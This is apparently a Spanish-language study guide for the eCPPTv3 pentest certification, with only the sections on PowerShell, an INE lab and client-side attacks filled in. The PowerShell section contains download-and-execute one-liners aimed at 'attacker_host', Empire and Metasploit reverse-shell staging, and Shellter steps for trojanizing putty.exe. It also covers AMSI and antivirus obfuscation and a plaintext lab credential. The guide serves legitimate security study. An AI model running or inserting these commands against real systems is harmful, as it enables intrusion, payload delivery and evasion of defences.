# eCPPTv3-Study-Guide (Work In Progress)
## Índice
- [01 - PowerShell for Pentesters](#01---powershell-for-pentesters)
- [02 - Client-Side Attacks](#02---client-side-attacks)
- [03 - Web Application Penetration Testing](#03---web-application-penetration-testing)
- [04 - Network Penetration Testing](#04---network-penetration-testing)
- [05 - System Security & x86 Assembly Fundamentals](#05---system-security--x86-assembly-fundamentals)
- [06 - Exploit Development: Buffer Overflows](#06---exploit-development-buffer-overflows)
- [07 - Privilege Escalation](#07---privilege-escalation)
- [08 - Lateral Movement & Pivoting](#08---lateral-movement--pivoting)
- [09 - Active Directory Penetration Testing](#09---active-directory-penetration-testing)
- [10 - Command & Control (C2/C&C)](#10---command--control-cc)
  
## 01 - PowerShell for Pentesters

### ~ PowerShell Fundamentals

```bash
- Viene preinstalado en todo Windows moderno (7 / 2008 R2+) → living-off-the-land: usamos herramientas nativas del sistema en lugar de subir binarios externos.
- Muchas organizaciones no monitorean activamente la actividad de PowerShell porque se considera una app "de confianza".
- Permite ejecutar/descargar código en memoria (evade AV/EDR basados en firmas de disco).
- Acceso directo a .NET Framework, COM y WMI → útil para enumeración, persistencia y post-explotación.
- Se pueden invocar funciones de DLLs de Windows y bypassear application whitelisting.
- Extensiones: .ps1 (scripts), .psm1 (módulos).

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe       # Ruta del ejecutable 64-bit
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe        # Ruta del ejecutable 32-bit

PS C:\> [Environment]::Is64BitProcess # Verificar si el proceso actual es 64-bit:

PS C:\> powershell /? # Opciones

# La política de ejecución de PowerShell determina qué scripts —si es que hay alguno— podemos ejecutar, y puede desactivarse fácilmente mediante los argumentos «Bypass» o «Unrestricted».
C:\> powershell.exe -ExecutionPolicy Bypass .\script.ps1
C:\> powershell.exe -ExecutionPolicy Unrestricted .\script.ps1

C:\> powershell.exe -WindowStyle Hidden .\script.ps1 # WindowStyle oculta la ventana de PowerShell cuando se utiliza con el argumento «hidden».
C:\> powershell.exe -Command Get-Process # El parámetro -Command se utiliza para especificar un comando o un bloque de script que se va a ejecutar.
C:\> powershell.exe -Command “& { Get-EventLog –LogName security }”
C:\> powershell.exe -EncodedCommand $encodedCommand # El parámetro -EncodedCommand se utiliza para ejecutar scripts o comandos codificados en Base64.
C:\> powershell.exe -NoProfile .\script.ps1 # No cargar perfiles (evita interferencias)
C:\> powershell.exe –Version 2 # Downgrade de versión (si está instalada)

# Cmdlet = mini-script nativo de PowerShell, formato Verbo-Sustantivo (ej. Get-Process, Invoke-Command).
# El output de un cmdlet es un objeto (no texto plano como en bash), lo que permite filtrar por propiedades específicas.

C:\> Get-Help <cmdlet>              # ayuda básica
C:\> Get-Help <cmdlet> -Full        # ayuda completa con parámetros
C:\> Get-Help <cmdlet> -Examples    # ejemplos de uso
C:\> Get-Help <cmdlet> -Online      # abre la doc web
C:\> Update-Help                    # actualiza archivos de ayuda locales

C:\> Get-Command                    # lista todos los cmdlets/alias/funciones disponibles
C:\> Get-Command -Name *Firewall*   # filtrar por nombre (wildcard)
C:\> powershell -Command Get-Process # Util para enumeración

Get-Help: https://technet.microsoft.com/enus/library/cc764318.aspx

PS C:\> Get-Process | Sort-Object -Unique | Select-Object ProcessName # Pipelining
PS C:\> Get-Process | Sort-Object -Unique | Select-Object ProcessName > uniq_procs.txt   # redirigir a archivo
PS C:\> Get-Process | Format-List *              # alias: fl
PS C:\> Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path, Id
PS C:\> Get-Alias -Definition Get-ChildItem # Encontrar el alias de un cmdlet
PS C:\> Get-WmiObject -class win32_operatingsystem | select -Property *
PS C:\> Get-WmiObject -class win32_operatingsystem | fl *
PS C:\> Get-WmiObject -class win32_service |Format-List *
PS C:\> Get-WmiObject -class win32_service |Sort-Object -Unique PathName | fl Pathname
PS C:\> Get-WmiObject -class win32_operatingsystem | fl * | Export-Csv C:\host_info.csv # Exportar archivo a CSV
PS C:\> cd HKLM:\  # Acceder a los subárboles del Registro de Windows

PS HKLM:\> cd .\SOFTWARE\Microsoft\Windows\CurrentVersion\
PS HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\> ls

PS C:\> Select-String -Path C:\users\user\Documents\*.txt -Pattern pass* # Búsqueda de credenciales / strings sensibles (muy relevante para post-explotación)
PS C:\> Get-Content C:\Users\user\Documents\passwords.txt
# Búsqueda recursiva en un directorio:
PS C:\> ls -r C:\users\user\Documents -File .txt | % { sls -Path $_ -Pattern pass }
# % = alias ForEach-Object | sls = alias Select-String | $_ = valor actual del pipeline
PS C:\> Get-Service
PS C:\> Get-Service “s*” | Sort-Object Status -Descending

# PowerShell Modules

- Archivo .psm1 que agrupa funcionalidades de PS en un solo archivo reutilizable.
- Tipos: Script Modules (.psm1), Binary Modules, Manifest Modules, Dynamic Modules.

PS C:\> Get-Module                    # listar módulos importados en la sesión actual
PS C:\> Get-Module -ListAvailable     # listar todos los módulos disponibles para importar
PS C:\> Import-Module .\module.psm1   # importar un módulo desde ruta local
PS C:\> Import-Module PowerSploit     # importar módulo por nombre (si está en PSModulePath)
PS C:\> $Env:PSModulePath             # ver rutas donde PS busca módulos
PS C:\> Get-Command -Module PowerSploit  # listar todos los cmdlets de un módulo importado
PS C:\> Get-Help Write-HijackDLL      # obtener ayuda de un cmdlet específico del módulo

# PowerSploit — framework ofensivo en PS
# Repo: https://github.com/PowerShellMafia/PowerSploit
# Instalar: descargar .zip → extraer → copiar carpeta a:
# C:\Users\user\Documents\WindowsPowerShell\Modules\PowerSploit\
# Nota: el AV lo va a detectar → crear exclusión de directorio antes de descargar

---

# PowerShell Scripts

# .ps1 = script de PowerShell (el "1" es el motor, no la versión)
PS C:\> .\script.ps1                          # ejecutar script en directorio actual
PS C:\> powershell.exe -ExecutionPolicy Bypass .\script.ps1  # bypass si hay restricción

PS C:\> $file = "users.txt"
PS C:\> Get-Content $file                     # alternativa rápida sin escribir .ps1

# Loop Statements — iterar colecciones, archivos, puertos, etc.
PS C:\> Get-Help about_Foreach
PS C:\> Get-Help about_For
PS C:\> Get-Help about_While
PS C:\> Get-Help about_Do

# foreach — iterar una colección de objetos
PS C:\> $services = Get-Service
PS C:\> foreach ($service in $services) { $service.Name }

# ForEach-Object — equivalente con pipeline (% es alias)
PS C:\> Get-Service | ForEach-Object { $_.Name }
PS C:\> Get-Service | % { $_.Name }           # forma corta con alias

# Where-Object — filtrar objetos por propiedad
PS C:\> Get-ChildItem C:\PowerShell\ | Where-Object { $_.Name -match "xls" }

# TCP Port Scanner one-liner
PS C:\> $ports=(80,443,8080); $ip="192.168.1.1"; foreach ($port in $ports) { try { $socket = New-Object System.Net.Sockets.TcpClient($ip,$port); } catch {}; if ($socket -eq $null) { echo "$ip:$port - Closed" } else { echo "$ip:$port - Open"; $socket = $null } }

---

# PowerShell Objects

# Los cmdlets devuelven objetos .NET, no texto plano → se pueden filtrar por propiedades y manipular con métodos.

PS C:\> Get-Process | Get-Member -MemberType Method   # ver métodos disponibles de un objeto
PS C:\> Get-Process -Name "firefox" | Kill            # llamar método Kill sobre el objeto proceso

# Crear objetos .NET con New-Object — muy útil para descargas y conexiones
PS C:\> $webclient = New-Object System.Net.WebClient
PS C:\> $payload_url = "https://attacker_host/payload.exe"
PS C:\> $file = "C:\ProgramData\payload.exe"
PS C:\> $webclient.DownloadFile($payload_url, $file)   # descargar payload a disco

# Alternativa más corta con IEX (Invoke-Expression) — ejecuta en memoria sin tocar disco
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://attacker_host/script.ps1')
# ↑ Importante para evasión de AV: nunca escribe el script en disco

```
### ~ PowerShell for Pentesting

```bash
# CONCEPTOS CLAVE
# Pivoting: usar una máquina comprometida como puente hacia redes internas
# C2 (Command & Control): servidor que maneja agentes en máquinas comprometidas
# Listener: puerto en Kali que espera conexiones entrantes de agentes
# Stager: código PS que se ejecuta en la víctima y la hace conectarse al listener
# Agente: proceso activo en la víctima conectado al C2
# autoroute: le dice a MSF cómo enrutar tráfico por una sesión activa
# SOCKS proxy: tuneliza tráfico del browser por la sesión Meterpreter

# Leveraging PowerShell During Exploitation
10.4.30.114    demo.ine.local -> acceso directo
10.4.20.133    fileServer.ine.local -> pivotar
nmap -p- demo.ine.local # enumeracion
nmap -sV -p 4983 demo.ine.local # verificamos servicio
# Al ingresar al servicio HTTP encontramos /user:Administrator abc_123321!@#
smbexec.py 'Administrator:abc_123321!@#'@demo.ine.local # Probamos acceso con smb

# Empezamos powershell-empire
powershell-empire server # servidor en una nueva terminal
powershell-empire client # cliente en otra terminal
(Empire) > uselistener http # área de configuración del oyente http
set Host 10.10.42.2 # ip de mi kali
set Port 8888 # puerto de mi kali
#  Ahora que nuestro oyente está despierto y "escuchando", querremos generar un "stager" El "stager" es el código que ejecutaremos en nuestro objetivo una vez que lo generemos. Podemos generar un stager saliendo primero del área "Listener" y regresando a la sección "main" ejecutando el comando "main" y luego escribiendo el comando "usestager". Si escribimos "usestager" " Deberíamos obtener una lista de todos los escenarios disponibles.
(Empire) > usestager multi/launcher # 
(Empire: usestager/multi/launcher) > set Listener http # el nombre de nuestro oyente era "http"
(Empire: usestager/multi/launcher) > execute #  Empire genera nuestro código de stager
#En este punto, Empire ha generado un comando codificado en PowerShell. Luego copiamos y pegamos el código PowerShell generado por Empire en nuestro shell smbexec
# Si ahora escribimos el comando "agentes" dentro de Empire, podemos confirmar que nuestro agente ha llamado a casa a Empire C2 y actualmente está activo a través del proceso "powershell" en el sistema de destino
[+] New agent 631AN7HD checked in
(Empire: agents) > interact 631AN7HD # Interactar con el agente 
(Empire: 631AN7HD) > usemodule powershell/situational_awareness/host/computerdetails # Usar modulos (como en msfconsole)
usemodule powershell/situational_awareness/network/portscan
set Hosts 10.4.20.133 # la maquina faltante
msfconsole # en otra terminal
use exploit/multi/script/web_delivery
set target 2
set SRVHOST 10.10.42.2 # Esta es la dirección IP de la máquina Kali.
set LHOST 10.10.42.2
set payload windows/meterpreter/reverse_tcp
exploit # se genera http://10.10.42.2:8080/E8tlUIOl
usemodule powershell/code_execution/invoke_metasploitpayload # De vuelta en nuestro Empire C2, para pasar nuestro agente a metasploit, necesitamos cargar el módulo "invoke_metasploitpayload".
usemodule powershell/code_execution/invoke_metasploitpayload
set URL http://10.10.42.2:8080/E8tlUIOl
execute
# autoroute — agrega rutas en la tabla de Metasploit para que el tráfico
# hacia la red interna (10.4.20.0/24) pase por la sesión Meterpreter de demo
# sin esto, Metasploit no sabe cómo llegar a fileserver
use post/multi/manage/autoroute
set SESSION 1
run
# socks_proxy — levanta un proxy SOCKS5 en Kali en el puerto 1080
# permite tunelizar tráfico del browser por la sesión, simulando estar en la red interna
use auxiliary/server/socks_proxy
set SRVHOST 10.10.42.2
run
# A continuación, después de configurar el módulo proxy Socks, debemos configurar nuestro navegador para usar nuestro proxy Socks5.
# Luego seleccione Configuración de red para abrir la configuración de conexión. Seleccione SOCKS Host y proporcione la dirección IP de la máquina Kali y el puerto como 1080.
# Abra otra pestaña en Firefox. Deberíamos poder navegar a la máquina fileserver.ine.local y observamos que BadBlue Enterprise Edition se está ejecutando en la máquina remota.

search badblue # en metasploit
use 1
set RHOSTS fileserver.ine.local
set PAYLOAD windows/meterpreter/bind_tcp
exploit
pwd
cd ../../../
pwd
ls
cat flag.txt
```

#### AV Evasion with Shellter

- Encoding: Convierte el payload a otro formato — por ejemplo Base64 — para que los bytes sean diferentes. El problema es que los AV modernos también conocen los encoders más comunes como shikata_ga_nai de Metasploit, así que solos ya no funcionan bien. Útil como capa adicional, no como técnica única.
- Obfuscation: Cambia la apariencia del código sin cambiar lo que hace — renombra variables, agrega código basura, parte strings, cambia el orden. Muy usado en PowerShell porque el AV analiza el texto del script antes de ejecutarlo.
* Invoke-Mimikatz # Original — detectado
* $a = "Invoke"; $b = "-Mimikatz"; &($a+$b) # Obfuscado — más difícil de detectar
- Packing: Comprime o empaqueta el ejecutable y agrega un "unpacker" que lo descomprime en memoria al ejecutarse. El AV ve el ejecutable comprimido y no reconoce el payload adentro. UPX es el packer más conocido aunque ya está bastante detectado.
- Crypters: Similar al packing pero en vez de comprimir, cifra el payload. Al ejecutarse, descifra el payload en memoria y lo corre. Es más efectivo que encoding o packing porque el payload cifrado es básicamente ruido aleatorio para el AV. Los crypters más efectivos son FUD (Fully UnDetectable) y suelen ser de pago o privados.
- Shellter: Es una herramienta que combina varias de estas técnicas de forma automática. Toma un ejecutable legítimo de Windows (como putty.exe) e inyecta tu payload dentro de él, modificando el flujo de ejecución para que el exe legítimo funcione normal pero también ejecute tu payload. Es efectivo porque el AV ve un ejecutable conocido y confiable.

```bash
# AV EVASION CON SHELLTER
# Shellter inyecta un payload malicioso dentro de un ejecutable legítimo de Windows
# El AV ve el exe legítimo (putty.exe, wincmd.exe, etc.) y no detecta el payload adentro
# Requiere wine para correr en Kali (es una herramienta de Windows)

# Instalación
sudo dpkg --add-architecture i386   # habilitar arquitectura 32-bit (shellter es x86)
sudo apt-get update
sudo apt-get install wine32 -y
sudo apt-get install shellter -y

# Uso (desde la ruta donde está shellter.exe)
sudo wine shellter.exe

> A               # Modo automático (vs Manual que da más control pero es más complejo)
> PE Target:      # Ruta del ejecutable LEGÍTIMO que vamos a infectar (ej: /root/putty.exe)
                  # Importante: debe ser un exe de 32-bit
> Stealth Mode: Y # El exe legítimo sigue funcionando normal — no levanta sospechas
> L               # Usar payload de la lista predefinida (meterpreter, shell, etc.)
> [elegir opción] # Típicamente meterpreter_reverse_tcp
> LHOST: <ip atacante>
> LPORT: <puerto>

# Resultado: el exe original queda modificado con el payload inyectado
# Al ejecutarlo en la víctima → funciona el programa legítimo + se abre la reverse shell
# En Kali tener el listener activo antes de ejecutar en la víctima:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <puerto>; run"
```

#### Obfuscating PowerShell Code

```bash
# OBFUSCATING POWERSHELL CODE CON INVOKE-OBFUSCATION
# Los AV/EDR analizan scripts PS antes de ejecutarlos (via AMSI)
# Invoke-Obfuscation modifica la estructura del código para evadir esa detección
# sin cambiar lo que el script hace

# Instalación de PowerShell en Kali
sudo apt-get install powershell -y

# Uso
pwsh                                    # abrir PowerShell en Kali
cd ./Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1 # cargar el módulo
cd ..
Invoke-Obfuscation                      # iniciar la herramienta

# Dentro de Invoke-Obfuscation:
SET SCRIPTPATH <ruta del .ps1>  # script que queremos ofuscar
AST                             # modo Abstract Syntax Tree — ofusca la estructura
                                # lógica del código, no solo el texto
                                # es el modo más efectivo contra AMSI
ALL                             # aplicar todas las técnicas de ofuscación AST
1                               # confirmar — devuelve el script ofuscado

# Otros modos disponibles (menos efectivos que AST):
# TOKEN    — ofusca partes individuales (strings, comandos)
# STRING   — ofusca strings dentro del código
# ENCODING — codifica el script completo
# COMPRESS — comprime y ofusca

# Output: script .ps1 con el mismo comportamiento pero irreconocible para el AV
```
### ~ SkillCheck CTF1

```bash
server.prod.local (10.4.23.70)  -> directo
web.prod.local (10.4.19.58) -> pivote

# nmap -sV -p 135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49681 10.4.23.70                                                                              
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)


```

## 02 - Client-Side Attacks

### ~ Client-Side Attacks

#### Qué son
- Ataques que explotan el eslabón más débil: los empleados/usuarios
- No requieren acceso directo al sistema — se entregan via email, USB, sitios comprometidos
- Más peligrosos que server-side porque no necesitan vulnerabilidades en servidores

#### Flujo general
Reconocimiento → Identificar objetivo → Desarrollar payload
→ Preparar entrega → Entregar payload → Ejecución → Post-explotación

#### Ventajas para el atacante
- Superficie de ataque enorme (todos los endpoints)
- Explota comportamiento humano, no solo software
- Endpoints tienen menos controles que servidores
- Facilita movimiento lateral una vez dentro

#### Client-Side vs Server-Side
- Client-Side: apunta a usuarios (phishing, macros, HTA, drive-by downloads)
- Server-Side: apunta a servidores (SQLi, RCE, SSRF, misconfigs)
  
### ~ Reconnaissance

#### Objetivo
- Identificar info del objetivo ANTES de desarrollar el payload
- Adaptar el ataque según el entorno del target (browser, OS, plugins)

#### Client-Side Information Gathering
- Fuentes OSINT: LinkedIn, redes sociales, web corporativa, job postings
- Job postings revelan tecnologías usadas internamente (ej: "se requiere experiencia en Office 365")
- Herramientas: theHarvester, Maltego, Shodan

#### Client Fingerprinting
- Identificar browser, versión, OS, plugins, resolución del objetivo
- Útil para adaptar el payload al entorno específico del target
- Herramientas: fingerprintjs, grabify.link (tracking links)
- Técnica: enviar un link al objetivo y capturar info del request HTTP
  - User-Agent → browser y OS
  - IP → geolocalización
  - Headers → configuración del cliente

### ~ Social Engineering

#### Qué es
- Manipulación psicológica para que el objetivo realice una acción
- No explota software — explota comportamiento humano

#### Técnicas principales
- Phishing — email masivo con payload o link malicioso
- Spear Phishing — phishing dirigido a una persona específica (más efectivo)
- Vishing — phishing por voz/llamada
- Smishing — phishing por SMS
- Pretexting — crear una historia creíble para justificar la interacción

#### Pretexting
- Crear un escenario falso convincente para que el objetivo confíe
- Ejemplos: hacerse pasar por IT, RRHH, proveedor, banco
- Elementos clave: urgencia, autoridad, confianza

#### GoPhish — Phishing Campaigns
* Instalación
wget https://github.com/gophish/gophish/releases/...
chmod +x gophish
./gophish

* Panel admin en https://localhost:3333 (credenciales por defecto admin:gophish)

#### Componentes de una campaña en GoPhish
1. Sending Profile — servidor SMTP para enviar los emails
2. Landing Page — página falsa que clona el sitio legítimo
3. Email Template — el email de phishing con el link a la landing page
4. Users & Groups — lista de objetivos
5. Campaign — une todo y lanza el ataque

#### Métricas que trackea GoPhish
- Email enviado
- Email abierto
- Link clickeado
- Credenciales enviadas (si hay formulario)

### ~ Development & Weaponization

#### Resource Development & Weaponization

- Fase del ataque donde el atacante prepara los recursos necesarios para el ataque
- En pentesting/red team: desarrollar payloads, infraestructura y herramientas antes de la entrega
- Corresponde a la fase "Weaponization" del Cyber Kill Chain

~ Cyber Kill Chain (contexto)
Reconocimiento → Weaponization → Entrega → Explotación
→ Instalación → C2 → Acciones sobre objetivos

~ MITRE ATT&CK Framework
- Base de conocimiento de tácticas y técnicas usadas por atacantes reales
- Útil para mapear ataques a técnicas conocidas y documentar hallazgos
- URL: https://attack.mitre.org

~ Estructura
- Tácticas: el "qué" — objetivo del atacante (ej: Initial Access, Execution, Persistence)
- Técnicas: el "cómo" — método específico (ej: T1566 Phishing, T1059 Command Scripting)
- Sub-técnicas: variantes específicas (ej: T1566.001 Spearphishing Attachment)

~ Técnicas relevantes para Client-Side Attacks
- T1566.001 — Spearphishing Attachment
- T1566.002 — Spearphishing Link
- T1059.001 — PowerShell
- T1059.005 — VBA Macros
- T1027     — Obfuscated Files or Information
- T1204.002 — User Execution: Malicious File

~ Por qué importa en pentesting
- Los reportes profesionales mapean cada hallazgo a su técnica ATT&CK
- Permite al cliente entender qué tácticas reales emuló el pentest
- Los blue teams usan ATT&CK para detectar y responder ataques

~ Resource Development
- Registrar dominios para phishing (typosquatting: rnicrosof.com vs microsoft.com)
- Configurar infraestructura C2
- Obtener/crear certificados SSL para parecer legítimo
- Crear cuentas falsas en redes sociales para pretexting
- Comprometer infraestructura de terceros para usarla como relay

~ Weaponization
- Combinar un payload malicioso con un vector de entrega legítimo
- Objetivo: que el archivo/link parezca inofensivo pero ejecute código malicioso
- Vectores comunes:
  - Documentos Office con macros (Word, Excel)
  - PDFs con JavaScript embebido
  - HTML Applications (.hta)
  - Archives (.zip, .iso) con payloads adentro
  - Links a páginas con drive-by downloads

~ Payload vs Exploit
- Exploit: código que aprovecha una vulnerabilidad
- Payload: código que se ejecuta DESPUÉS del exploit (reverse shell, dropper, etc.)
- En client-side attacks el "exploit" suele ser ingeniería social,
  no una vulnerabilidad técnica

~ Staged vs Stageless Payloads
- Stageless: payload completo en un archivo — más grande, más detectable
- Staged: payload pequeño (stager) que descarga el payload real desde C2
  — más sigiloso, requiere conexión a internet desde la víctima


## 03 - Web Application Penetration Testing
## 04 - Network Penetration Testing
## 05 - System Security & x86 Assembly Fundamentals
## 06 - Exploit Development: Buffer Overflows
## 07 - Privilege Escalation
## 08 - Lateral Movement & Pivoting
## 09 - Active Directory Penetration Testing
## 10 - Command & Control (C2/C&C)
